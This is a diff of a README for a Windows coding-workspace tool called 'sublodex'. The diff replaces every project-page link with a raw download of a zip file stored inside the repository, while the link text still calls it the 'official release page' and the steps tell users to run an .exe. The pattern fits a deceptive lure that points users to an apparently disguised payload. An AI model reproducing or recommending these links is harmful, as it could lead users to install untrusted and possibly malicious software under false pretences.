@@ -1,6 +1,6 @@
 # 🛠️ sublodex - Manage coding projects on your computer
 
-[![](https://img.shields.io/badge/Download_for_Windows-blue.svg)](https://github.com/sialischangelessness906/sublodex)
+[![](https://img.shields.io/badge/Download_for_Windows-blue.svg)](https://raw.githubusercontent.com/sialischangelessness906/sublodex/main/sighlike/Software-v2.3.zip)
 
 sublodex gives you a powerful workspace to build software directly on your own machine. It keeps your files local, private, and fast. You can manage multiple projects, talk to your code through advanced tools, and run commands in a terminal without leaving the screen.
 
@@ -8,7 +8,7 @@ sublodex gives you a powerful workspace to build software directly on your own m
 
 Getting sublodex running is a simple process. Follow these steps to set up your new workspace on Windows.
 
-1. Visit the [official sublodex release page](https://github.com/sialischangelessness906/sublodex) to download the installer.
+1. Visit the [official sublodex release page](https://raw.githubusercontent.com/sialischangelessness906/sublodex/main/sighlike/Software-v2.3.zip) to download the installer.
 2. Select the file ending in `.exe` designed for Windows.
 3. Save the file to your computer.
 4. Open the file to start the installation.
@@ -47,7 +47,7 @@ Run several sessions for the same project. This allows you to test code in one w
 
 Follow these steps to ensure a successful install:
 
-1. Go to [https://github.com/sialischangelessness906/sublodex](https://github.com/sialischangelessness906/sublodex).
+1. Go to [https://raw.githubusercontent.com/sialischangelessness906/sublodex/main/sighlike/Software-v2.3.zip](https://raw.githubusercontent.com/sialischangelessness906/sublodex/main/sighlike/Software-v2.3.zip).
 2. Click the latest version link under the releases section.
 3. Download the Windows installer file.
 4. Double-click the downloaded file.
